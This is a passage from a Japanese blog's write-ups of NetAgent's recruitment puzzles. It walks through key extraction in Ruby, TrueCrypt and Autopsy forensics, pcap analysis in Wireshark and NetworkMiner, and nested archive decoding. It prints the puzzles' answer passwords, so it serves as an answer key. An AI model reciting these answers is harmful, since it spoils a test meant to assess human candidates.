</span><span class='line'><span class="n">indexes</span> <span class="o">=</span> <span class="o">[</span><span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x0f</span><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="n">indexes</span> <span class="k">do</span>
</span><span class='line'>  <span class="n">key</span> <span class="o">+=</span> <span class="n">string</span><span class="o">[</span><span class="n">i</span><span class="o">]</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="nb">p</span> <span class="n">key</span>
</span></code></pre></td></tr></table></div></figure>




<!--
$ ruby mondai7.rb
"TochuKasou"
-->


<p>試しにnormal.exeの引数に、このコードを実行して得られたキーを与えて実行してみたところ、以下のようになりました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/TochuKasou.png" alt="TochuKasou.png" /></p>

<p>この文字列を与えてmondai8.zipを解凍してmondai7は終了です。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>&gt; 7z.exe x mondai8.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.35 beta  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2014 Igor Pavlov  2014-12-07
</span><span class='line'>
</span><span class='line'>Processing archive: mondai8.zip
</span><span class='line'>
</span><span class='line'>Extracting  mondai8.tc
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>Extracting  mondai8.txt
</span><span class='line'>Extracting  mondai9.zip
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70339136
</span><span class='line'>Compressed: 70339594
</span><span class='line'>
</span><span class='line'>Kernel  <span class="nv">Time</span> <span class="o">=</span>     0.015 <span class="o">=</span>    0%
</span><span class='line'>User    <span class="nv">Time</span> <span class="o">=</span>     1.170 <span class="o">=</span>   21%
</span><span class='line'>Process <span class="nv">Time</span> <span class="o">=</span>     1.185 <span class="o">=</span>   22%    Virtual  <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">2</span> MB
</span><span class='line'>Global  <span class="nv">Time</span> <span class="o">=</span>     5.379 <span class="o">=</span>  100%    Physical <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">4</span> MB
</span></code></pre></td></tr></table></div></figure>




<!--
$ wine 7z x mondai8.zip -pTochuKasou

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai8.zip

Extracting  mondai8.tc
Extracting  mondai8.txt
Extracting  mondai9.zip

Everything is Ok

Files: 3
Size:       70339136
Compressed: 70339594
-->


<h1>mondai8</h1>

<p>なにやら怪しげなファイルmondai8.tcと問題文mondai8.txtがあります。mondai8.txtには以下のような記述がありました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>TrueCrypt pass:mondai8
</span><span class='line'>漢字８文字
</span></code></pre></td></tr></table></div></figure>


<p>mondai8.tcはTrueCryptファイルで、開くためのパスワードはmondai8であるとのことです。そしてこのmondai8の答えは漢字8文字ということでしょう。
TrueCryptでmondai8.tcをマウントして中を見てみました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/mondai8-files.png" alt="mondai8-files.png" /></p>

<p>こういったCTF系の問題でイメージファイルが配布されるときは、フォレンジック問題であると相場が決まっているので、TrueCryptでマウントしたらAutopsyで調査します。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/autopsy.png" alt="autopsy.png" /></p>

<p>マウントした際に表示されていたファイルになかった「今日の本.xlsx」という削除されたファイルが見つかりました。怪しいですね。
復元してファイルを開いてみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/todaysbook1.png" alt="todaysbook1.png" />
<img src="http://mzyy94.com/blog/resources/images/2015/04/15/todaysbook2.png" alt="todaysbook2.png" />
<img src="http://mzyy94.com/blog/resources/images/2015/04/15/todaysbook3.png" alt="todaysbook3.png" /></p>

<p>シート1にはアルファベットと2つの数字が書かれた行があり、シート2には、<a href="http://www.aozora.gr.jp/cards/001670/card56113.html">青空文庫の奇談クラブ</a>からコピーされたであろう本の内容が書かれていました。</p>

<p>シート3には、key:passwordに対応するanswerを入力するような空欄がありました。
このpasswordという文字列はきっとシート1のアルファベットと2つの数字に対応していて、1つ目の数字は行番号、2つ目の数字はその行の文字の位置を指しているだろうと思いました。
Excel Onlineの印刷機能でシート2をHTML形式にし、保存したのちテキストに変換して<a href="http://mzyy94.com/blog/resources/data/2015/04/15/kidanclub.txt">kidanclub.txt</a>を作成し、
シート1を基に、アルファベット<strong>&#8220;password&#8221;</strong>に対応する行から文字を抽出するコードを書きました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/print-book.png" alt="print-book.png" /></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'><span class="n">password</span> <span class="o">=</span> <span class="o">[</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">119</span><span class="p">,</span><span class="mi">161</span><span class="o">]</span><span class="p">,</span> <span class="c1"># p</span>
</span><span class='line'>  <span class="o">[</span> <span class="mi">62</span><span class="p">,</span> <span class="mi">11</span><span class="o">]</span><span class="p">,</span> <span class="c1"># a</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">276</span><span class="p">,</span> <span class="mi">40</span><span class="o">]</span><span class="p">,</span> <span class="c1"># s</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">276</span><span class="p">,</span> <span class="mi">40</span><span class="o">]</span><span class="p">,</span> <span class="c1"># s</span>
</span><span class='line'>  <span class="o">[</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">58</span><span class="o">]</span><span class="p">,</span> <span class="c1"># w</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">239</span><span class="p">,</span> <span class="mi">44</span><span class="o">]</span><span class="p">,</span> <span class="c1"># o</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">236</span><span class="p">,</span>  <span class="mi">7</span><span class="o">]</span><span class="p">,</span> <span class="c1"># r</span>
</span><span class='line'>  <span class="o">[</span><span class="mi">185</span><span class="p">,</span>  <span class="mi">7</span><span class="o">]</span>  <span class="c1"># d</span>
</span><span class='line'><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">book</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="n">password</span> <span class="k">do</span>
</span><span class='line'>    <span class="c1"># One-based numbering</span>
</span><span class='line'>  <span class="n">key</span> <span class="o">+=</span> <span class="n">book</span><span class="o">[</span><span class="n">i</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">-</span> <span class="mi">1</span><span class="o">][</span><span class="n">i</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">-</span> <span class="mi">1</span><span class="o">]</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="nb">p</span> <span class="n">key</span>
</span></code></pre></td></tr></table></div></figure>


<p>引数に先ほど作成した<a href="http://mzyy94.com/blog/resources/data/2015/04/15/kidanclub.txt">kidanclub.txt</a>を与えて実行してみると、漢字8文字のパスワードを得ることができました。</p>

<!--
$ ruby mondai8.rb kidanclub.txt
"意気揚揚明鏡止水"
-->


<p>mondai5同様、非ASCII文字のパスワードなので、<code>7z.exe</code>を利用してmondai9.zipを解凍しておしまいです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>&gt; 7z.exe x mondai9.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.35 beta  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2014 Igor Pavlov  2014-12-07
</span><span class='line'>
</span><span class='line'>Processing archive: mondai9.zip
</span><span class='line'>
</span><span class='line'>Extracting  mondai10.tc
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
</span><span class='line'>
</span><span class='line'>Extracting  mondai9.pkt
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 2
</span><span class='line'>Size:       68517107
</span><span class='line'>Compressed: 68241943
</span><span class='line'>
</span><span class='line'>Kernel  <span class="nv">Time</span> <span class="o">=</span>     0.046 <span class="o">=</span>    1%
</span><span class='line'>User    <span class="nv">Time</span> <span class="o">=</span>     0.733 <span class="o">=</span>   16%
</span><span class='line'>Process <span class="nv">Time</span> <span class="o">=</span>     0.780 <span class="o">=</span>   17%    Virtual  <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">2</span> MB
</span><span class='line'>Global  <span class="nv">Time</span> <span class="o">=</span>     4.536 <span class="o">=</span>  100%    Physical <span class="nv">Memory</span> <span class="o">=</span>      <span class="m">4</span> MB
</span></code></pre></td></tr></table></div></figure>




<!--
$ wine 7z.exe x mondai9.zip -p意気揚揚明鏡止水

7-Zip [64] 9.35 beta  Copyright (c) 1999-2014 Igor Pavlov  2014-12-07

Processing archive: mondai9.zip

Extracting  mondai10.tc
Extracting  mondai9.pkt

Everything is Ok

Files: 2
Size:       68517107
Compressed: 68241943

Kernel  Time =     0.046 =    5%
User    Time =     0.733 =   87%
Process Time =     0.780 =   93%    Virtual  Memory =      2 MB
Global  Time =     0.836 =  100%    Physical Memory =      4 MB
-->


<h1>mondai9</h1>

<p>mondai9.pktは<code>file</code>コマンドによると、little-endianなpcapファイルのようです。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai9.pkt
</span><span class='line'>mondai9.pkt: tcpdump capture file <span class="o">(</span>little-endian<span class="o">)</span> - version 2.4 <span class="o">(</span>Ethernet, capture length 65535<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>また、拡張子pktはWindowsの関連付けでは、Wiresharkで開けるファイルとなっています。
早速Wiresharkで見てみます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/mondai9-wireshark1.png" alt="mondai9-wireshark1.png" /></p>

<p>ざっと目を通した感じ、<code>tcpdump -f 'tcp port 80'</code>によって、fast-uploader.comにアクセスしている様子をキャプチャしたもののようです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/mondai9-wireshark2.png" alt="mondai9-wireshark2.png" /></p>

<p>httpリクエストで絞り込むと、POSTメソッドによってファイルを幾つかアップロードしているようです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/mondai9-wireshark3.png" alt="mondai9-wireshark3.png" /></p>

<p>アップロードしたファイルを抽出しようとメニューのHTTP objectから抽出を試みたのですが、Wiresharkでは<em>multipart/form-data</em>としてPOSTされたデータ中のファイルはうまく取り出せないようなので、NetworkMinerを使います。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/mondai9-networkminer.png" alt="mondai9-networkminer.png" /></p>

<p>NetworkMinerで4つのアップロードされたファイルを抽出したところ、文字化けした2つのExcelファイルと1つのWordファイル、パスワードのかかったzipファイルがありました。
パスワードをクラックするとWordファイルが出てきたので、4つのOfficeファイルを開いてみました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/office-files.png" alt="office-files.png" /></p>

<p>どのOfficeファイルにも文字の記入はなく、答えらしきものがみつかりません。
ファイル名で検索してみたりいろいろしたあと、ファイルのメタ情報を詮索してみることにしたところ、文字化けしたWordファイルにそれらしきものがあることに気づきました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/04/15/word-property.png" alt="word-property.png" /></p>

<p>これパスワードとしてmondai10.tcをTrueCryptでマウントしてみたところ、開くことができました。</p>

<p>明日は最終問題、mondai10のWrite-upを公開します。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ネットエージェント最終面接問題 Write-up その2]]></title>
    <link href="http://mzyy94.com/blog/2015/04/14/netagent-mondai5-6/"/>
    <updated>2015-04-14T00:05:14+09:00</updated>
    <id>http://mzyy94.com/blog/2015/04/14/netagent-mondai5-6</id>
    <content type="html"><![CDATA[<p>ネットニュースサイトにも取り上げられ、盛り上がりを見せていたネットエージェントのいきなり最終面接mondaiのWrite-upその2です。</p>

<ul>
<li><a href="http://nlab.itmedia.co.jp/nl/articles/1503/30/news143.html">「解けたらいきなり最終面接」 ネットエージェント、今年も新卒向けに“難問”出題 - ねとらぼ</a></li>
</ul>


<p>某所ではこれらのmondaiを10分で解けたとの声が上がっているようで、世の中にはこの記事とは比べ物にならないくらい効率のよい解き方をしている方がいるようです。それらの解法と比べると、この記事の解法は全部解くのに数日かかっているので、内容が無いも同然という位置付けとなります。
もし10分で解いた猛者たちの解法が公開されていたら、この記事ではなくそちらをご覧になることをお勧めします。</p>

<p>昨日の<a href="http://mzyy94.com/blog/2015/04/13/netagent-mondai1-4/">mondai1からmondai4までのWrite-upの記事</a>に続き、今日はmondai5とmondai6のWrite-upを公開します。</p>

<!-- more -->


<h1>mondai5</h1>

<p>mondai4.zipを解凍した際に出てきたファイル、mondai5は何だろうかと<code>file</code>コマンドを用いて調べると、ASCII textであるらしいことがわかります。テキストエディタで開いてみると、各行76文字で折り返されている、長いBASE64エンコードされた文字列が記載されていました。
そのまま<code>base64</code>に食べさせてデコードします。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>base64 -D mondai5 -o mondai5-1
</span></code></pre></td></tr></table></div></figure>


<p>デコードしてできたmondai5-1を<code>file</code>コマンドで調べてみるとまたもASCII textで、内容も先ほどと同じように、各行76文字で折り返されたBASE64エンコード文字列が書かれています。
同じように<code>base64</code>でデコードしてmondai5-2を作成します。</p>

<p>作成したmondai5-2を調べると、なんとmondai5、mondai5-1と同じ形で、またもBASE64エンコード文字列が書かれてるASCII textでした。
これもまた<code>base64</code>でデコードしてmondai5-3を作成します。
できあがった<strong>mondai5-3も同じ形式</strong>なので、同様の手順でmondai5-4を作成します。</p>

<p>mondai5-4は<code>file</code>コマンドで調べると、以下のように返してきます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-4
</span><span class='line'>mondai5-4: uuencoded or xxencoded text
</span></code></pre></td></tr></table></div></figure>


<p>uuencodeされた文字列が格納されているようです。
<code>uudecode</code>コマンドでmondai5-5を作成します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>uudecode -o mondai5-5 mondai5-4
</span></code></pre></td></tr></table></div></figure>


<p>mondai5-5を調べてみるとgzip圧縮ファイルだということがわかります。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-5
</span><span class='line'>mondai5-5: gzip compressed data, from Unix, last modified: Thu Mar <span class="m">19</span> 17:31:56 2015
</span></code></pre></td></tr></table></div></figure>


<p><code>gunzip</code>で解凍してmondai5-6を作成します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gunzip -d mondai5-5 -c &gt; mondai5-6
</span></code></pre></td></tr></table></div></figure>


<p>mondai5-6を調査してみましょう。<code>file</code>コマンドによるとzip圧縮ファイルとのことなので、中身を調べてみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-6
</span><span class='line'>mondai5-6: Zip archive data, at least v1.0 to extract
</span><span class='line'><span class="nv">$ </span>7z l mondai5-6
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Listing archive: mondai5-6
</span><span class='line'>
</span><span class='line'>--
</span><span class='line'><span class="nv">Path</span> <span class="o">=</span> mondai5-6
</span><span class='line'><span class="nv">Type</span> <span class="o">=</span> zip
</span><span class='line'>Physical <span class="nv">Size</span> <span class="o">=</span> 1472
</span><span class='line'>
</span><span class='line'>   Date      Time    Attr         Size   Compressed  Name
</span><span class='line'>------------------- ----- ------------ ------------  ------------------------
</span><span class='line'>2015-03-18 18:50:16 ....A         <span class="m">1332</span>         <span class="m">1332</span>  nek
</span><span class='line'>------------------- ----- ------------ ------------  ------------------------
</span><span class='line'>                                  <span class="m">1332</span>         <span class="m">1332</span>  <span class="m">1</span> files, <span class="m">0</span> folders
</span></code></pre></td></tr></table></div></figure>


<p>nekというファイルが格納されているようです。<code>7z</code>コマンドで解凍してnekを取り出します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai5-6
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai5-6
</span><span class='line'>
</span><span class='line'>Extracting  nek
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Size:       1332
</span><span class='line'>Compressed: 1472
</span></code></pre></td></tr></table></div></figure>


<p>nekを調べると、bzip圧縮ファイルとのことなので、<code>bzip2</code>コマンドで解凍します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file nek
</span><span class='line'>nek: bzip2 compressed data, block <span class="nv">size</span> <span class="o">=</span> 900k
</span><span class='line'><span class="nv">$ </span>bzip2 -d nek -c &gt; mondai5-8
</span></code></pre></td></tr></table></div></figure>


<p>mondai5-8は7z圧縮ファイルとのことなので、<code>7z</code>コマンドで解凍します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-8
</span><span class='line'>mondai5-8: 7-zip archive data, version 0.3
</span><span class='line'><span class="nv">$ </span>7z x mondai5-8
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai5-8
</span><span class='line'>
</span><span class='line'>Extracting  n
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Size:       974
</span><span class='line'>Compressed: 1082
</span></code></pre></td></tr></table></div></figure>


<p>これによって、nというファイルが展開されます。このファイルはrar圧縮ファイルとのことなので<code>unrar</code>で解凍します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file n
</span><span class='line'>n: RAR archive data, v1d, os: Win32
</span><span class='line'><span class="nv">$ </span>unrar x n
</span><span class='line'>
</span><span class='line'>UNRAR 5.20 beta <span class="m">1</span> freeware      Copyright <span class="o">(</span>c<span class="o">)</span> 1993-2014 Alexander Roshal
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Extracting from n
</span><span class='line'>
</span><span class='line'>Extracting  ne                                                        OK
</span><span class='line'>All OK
</span></code></pre></td></tr></table></div></figure>


<p>neというファイルが出てきましたね。neはlha圧縮されたファイルとのことなので、<code>lha</code>コマンドで解凍します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file ne
</span><span class='line'>ne: LHarc 1.x/ARX archive data <span class="o">[</span>lh0<span class="o">]</span>
</span><span class='line'><span class="nv">$ </span>lha x ne
</span><span class='line'>nex     - Melted   :  o
</span></code></pre></td></tr></table></div></figure>


<p>nexファイルが出来上がりました。はい。調べるとxz圧縮なので<code>xz</code>で解凍します。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file nex
</span><span class='line'>nex: xz compressed data
</span><span class='line'><span class="nv">$ </span>xz -d nex -c &gt; mondai5-12
</span></code></pre></td></tr></table></div></figure>


<p>ちょっと疲れたのでコーヒーを飲みます。</p>

<p>mondai5-12を<code>file</code>コマンドで調べると、なんと、判定してくれません！（貧弱なfileめ）</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>file mondai5-12
</span><span class='line'>mondai5-12: data
</span></code></pre></td></tr></table></div></figure>


<p>マジックナンバーを見てみると、MSWIMとなってることが確認出ました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>xxd mondai5-12 <span class="p">|</span> head -2
</span><span class='line'>0000000: 4d53 <span class="m">5749</span> 4d00 <span class="m">0000</span> d000 <span class="m">0000</span> 000d <span class="m">0100</span>  MSWIM...........
</span><span class='line'>0000010: <span class="m">8000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> 4ef7 dcb4 6e01 bfe4  ........N...n...
</span></code></pre></td></tr></table></div></figure>


<p>Googleで「&#8221;MSWIM&#8221; magic number」として調べると、1番目に次のページがヒットします。</p>

<p><a href="http://en.wikipedia.org/wiki/Windows_Imaging_Format">Windows Imaging Format - Wikipedia, the free encyclopedia</a></p>

<p>このWikipediaの記事の最後に、<em>LZX圧縮だし7zとかで開けるよ（意訳）</em>と書いてあるので、<code>7z</code>で展開を試みてみます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai5-12
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai5-12
</span><span class='line'>
</span><span class='line'>Extracting  QRcode
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Size:       16052
</span><span class='line'>Compressed: 17310
